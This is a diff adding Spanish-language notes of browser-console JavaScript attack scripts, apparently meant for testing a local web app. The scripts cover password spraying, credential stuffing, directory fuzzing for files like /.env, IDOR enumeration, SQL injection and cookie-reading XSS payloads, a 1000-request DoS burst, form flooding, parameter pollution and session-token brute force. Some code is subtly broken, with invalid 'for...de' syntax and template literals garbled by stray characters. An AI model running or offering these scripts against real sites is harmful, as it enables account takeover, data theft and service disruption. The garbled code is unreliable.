@@ -1,0 +1,285 @@
+Para contraseñas
+Fuerza Bruta Inversa
+// Lista de usuarios a probar
+const usuarios = ["admin", "juan", "maria", "pedro", "soporte", "test", "user1"];
+// Una contraseña sumamente común
+const contrasenaComun = "12345678"; 
+const urlLogin = "/api/login"; 
+async function passwordSpraying() {
+    console.log("🎯 Iniciando Password Spraying...");
+for (let usuario of usuarios) {
+    console.log(⁠ Probando usuario: ${usuario} con la contraseña común. ⁠);
+
+    try {
+        const respuesta = await fetch(urlLogin, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: usuario, password: contrasenaComun })
+        });
+
+        const datos = await respuesta.json();
+
+        if (respuesta.ok && datos.success) {
+            console.log(⁠ %c[¡VULNERABLE!] El usuario "${usuario}" usa la contraseña común. ⁠, 'background: #222; color: #ff9900; font-size: 14px;');
+        }
+    } catch (error) {
+        console.error("Error en la petición:", error);
+    }
+}
+console.log("🏁 Prueba de rociado finalizada.");
+
+}
+passwordSpraying();
+
+
+
+-Fuerza Bruta de Directorios o Rutas (Fuzzing de URL)
+
+// Diccionario de rutas que un administrador o desarrollador suele dejar expuestas
+const rutasOcultas = [
+    "/admin", "/v1/api", "/config", "/backup.sql", "/.env", 
+    "/api/users", "/dashboard", "/phpmyadmin", "/wp-admin", "/test"
+];
+
+async function buscarRutasOcultas() {
+    console.log("🔍 Escaneando directorios del proyecto...");
+
+    for (let ruta of rutasOcultas) {
+        // Construimos la URL completa basada en tu dominio actual
+        const urlObjetivo = window.location.origin + ruta;
+
+        try {
+            const respuesta = await fetch(urlObjetivo, { method: 'GET' });
+
+            // Si devuelve 200 (Existe) o 403 (Existe pero no hay permiso), la ruta está ahí.
+            if (respuesta.status === 200) {
+                console.log(⁠ %c[¡ENCONTRADO (200)!] Ruta expuesta: ${urlObjetivo} ⁠, 'background: #222; color: #00ff00; font-size: 14px;');
+            } else if (respuesta.status === 403) {
+                console.log(⁠ %c[AVISO (403)] La ruta existe pero está restringida: ${urlObjetivo} ⁠, 'color: #ffcc00;');
+            }
+        } catch (error) {
+            // Ignoramos errores de conexión
+        }
+    }
+    console.log("🏁 Escaneo de rutas finalizado.");
+}
+
+buscarRutasOcultas();
+
+
+​Entra directamente a http://localhost/dashboard.
+
+Igual prueba (prueba 1)
+
+// Probar si la ruta acepta que le enviemos datos (POST) o que borremos algo (DELETE)
+const urlDashboard = window.location.origin + "/dashboard";
+async function probarMetodos() {
+    const metodos = ['POST', 'PUT', 'DELETE'];
+for (let metodo of metodos) {
+    try {
+        const respuesta = await fetch(urlDashboard, { method: metodo });
+        console.log(⁠ Método ${metodo}: Código de estado ${respuesta.status} ⁠);
+    } catch (e) {
+        console.error(⁠ Error con ${metodo}: ⁠, e);
+    }
+}
+
+}
+probarMetodos();
+
+Pruebas de id por idor (prueba 2)
+
+const urlBase = window.location.origin + "/dashboard";
+async function probarIDOR() {
+    console.log("Visualizando respuestas para diferentes IDs de usuario...");
+// Simulamos probar del ID 1 al 10
+for (let id = 1; id <= 10; id++) {
+    // Construimos la URL con el parámetro (ej: http://localhost/dashboard?id=1)
+    const urlObjetivo = ⁠ ${urlBase}?id=${id} ⁠; 
+
+    try {
+        const respuesta = await fetch(urlObjetivo, { method: 'GET' });
+        const texto = await respuesta.text();
+
+        // Analizamos la longitud de la respuesta para ver si cambia según el usuario
+        console.log(⁠ ID ${id}: Código ${respuesta.status} - Tamaño de respuesta: ${texto.length} bytes ⁠);
+        
+        // Si el tamaño cambia significativamente, podría estar listando datos de un usuario real
+    } catch (error) {
+        console.error(⁠ Error probando ID ${id}: ⁠, error);
+    }
+}
+
+}
+probarIDOR();
+
+Cambio simulado por contraseña
+
+// Lista simulada de credenciales filtradas de otros sitios
+const credencialesFiltradas = [
+    { user: "juan@mail.com", pass: "juanito123" },
+    { user: "admin@proyecto.local", pass: "admin2026" },
+    { user: "maria_g", pass: "password" }
+];
+
+async function simularCredentialStuffing() {
+    for (let cred de credencialesFiltradas) {
+        console.log(⁠ Probando credencial filtrada para: ${cred.user} ⁠);
+        
+        const res = await fetch(window.location.origin + "/api/login", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: cred.user, password: cred.pass })
+        });
+        
+        const datos = await res.json();
+        if (res.ok && datos.success) {
+            console.log(⁠ %c[ÉXITO] El usuario reutilizó su contraseña: ${cred.user} ⁠, 'color: green; font-weight: bold;');
+        }
+    }
+}
+simularCredentialStuffing();
+
+-sql inyección 
+admin' OR '1'='1   en cualquier campo de inicio de sesion  y prueba este user:
+SELECT * FROM usuarios WHERE username = 'admin' OR '1'='1' AND password = 'xyz';
+
+-Ataque a la Lógica: Cross-Site Scripting / XSS 
+
+En un campo de texto que se guarde y se muestre en pantalla (como un comentario), ingresas una etiqueta de script en lugar de texto normal:
+En el campo de "Escribe un comentario" de un foro.
+​En el campo "Nombre" o "Biografía" al registrar o editar un perfil de usuario.imagen
+
+<script>alert('¡XSS Detectado!');</script>
+O una etiqueta de imagen con un error forzado para ejecutar JavaScript de inmediato:
+<img src="error" onerror="alert('XSS en consola: ' + document.cookie);">
+
+
+-Ataque de Denegación de Servicio: DoS por Bucle 
+
+async function simularDoS() {
+    console.log("Iniciando ráfaga de peticiones simulada...");
+    
+    // Genera 1000 peticiones en paralelo de golpe
+    const promesas = [];
+    for (let i = 0; i < 1000; i++) {
+        promesas.push(
+            fetch(window.location.origin + "/api/search?query=un_termino_muy_largo_y_pesado")
+        );
+    }
+    
+    // Se envían todas al mismo tiempo
+    await Promise.all(promesas);
+    console.log("Ráfaga completada. Verifica si el servidor se ralentizó.");
+}
+simularDoS();
+
+Es para realentizar
+
+•⁠  ⁠El Script para la Consola
+Puedes abrir la pestaña Console (Consola) en tu navegador y ejecutar este script que genera datos aleatorios y los envía de golpe al backend:
+
+// 1. Configura la ruta exacta de tu backend que procesa el formulario
+const urlFormulario = window.location.origin + "/api/contacto"; 
+
+// 2. Función para generar textos aleatorios (simulando datos de fuerza bruta)
+function generarTextoAleatorio(longitud) {
+    const caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let resultado = '';
+    for (let i = 0; i < longitud; i++) {
+        resultado += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
+    }
+    return resultado;
+}
+
+// 3. Función principal del ataque por fuerza bruta
+async function inundarFormulario(intentos) {
+    console.log(⁠ 🚀 Iniciando fuerza bruta: Enviando ${intentos} formularios... ⁠);
+
+    for (let i = 1; i <= intentos; i++) {
+        // Generamos datos aleatorios distintos para cada campo en cada intento
+        const datosSimulados = {
+            nombre: "Bot_" + generarTextoAleatorio(5),
+            correo: ⁠ ${generarTextoAleatorio(5)}@prueba.com ⁠,
+            mensaje: "Texto de prueba masivo: " + generarTextoAleatorio(20)
+        };
+
+        try {
+            const respuesta = await fetch(urlFormulario, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(datosSimulados)
+            });
+
+            console.log(⁠ [Formulario #${i}] Enviado. Servidor respondió con código: ${respuesta.status} ⁠);
+        } catch (error) {
+            console.error(⁠ [Formulario #${i}] Error de conexión: ⁠, error);
+        }
+    }
+    console.log("🏁 Ataque de fuerza bruta finalizado.");
+}
+
+// Ejecutar el ataque enviando 50 formularios seguidos
+inundarFormulario(50);
+
+-Contaminación de Parámetros (HTTP Parameter Pollution - HPP) 
+
+// Simulando el envío de un formulario duplicando parámetros
+const urlTransferencia = window.location.origin + "/api/transferir";
+
+async function simularHPP() {
+    // Enviamos el parámetro 'destino' dos veces en la misma cadena
+    // Uno legítimo y uno malicioso
+    const datosContaminados = "destino=cuenta_amigo&monto=50&destino=cuenta_atacante";
+
+    try {
+        const respuesta = await fetch(urlTransferencia, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/x-www-form-urlencoded' 
+            },
+            body: datosContaminados
+        });
+
+        console.log(⁠ Servidor respondió con estado: ${respuesta.status} ⁠);
+    } catch (error) {
+        console.error("Error en la petición:", error);
+    }
+}
+
+simularHPP();
+
+-Fuerza Bruta de Tokens de Sesión (Consola)
+
+const urlProtegida = window.location.origin + "/api/perfil-privado";
+
+async function forzarTokensSesion() {
+    console.log("🕵️‍♂️ Iniciando fuerza bruta de tokens de sesión...");
+
+    // Simulamos probar tokens correlativos del 1000 al 1050
+    for (let tokenAnómalo = 1000; tokenAnómalo <= 1050; tokenAnómalo++) {
+        try {
+            // Enviamos la petición incluyendo el token en los encabezados
+            // (Simulando que cambiamos nuestra cookie de sesión)
+            const respuesta = await fetch(urlProtegida, {
+                method: 'GET',
+                headers: {
+                    'Authorization': ⁠ Bearer TOKEN_SIMULADO_${tokenAnómalo} ⁠
+                }
+            });
+
+            // Si el servidor responde con 200, significa que adivinamos un token activo
+            if (respuesta.status === 200) {
+                console.log(⁠ %c[¡ÉXITO!] Token válido encontrado: TOKEN_SIMULADO_${tokenAnómalo} ⁠, 'background: #222; color: #00ff00; font-size: 14px;');
+                break; 
+            } else {
+                console.log(⁠ Token ${tokenAnómalo}: Acceso Denegado (${respuesta.status}) ⁠);
+            }
+        } catch (error) {
+            console.error("Error en la prueba:", error);
+        }
+    }
+    console.log("🏁 Prueba de tokens finalizada.");
+}
+
+forzarTokensSesion();
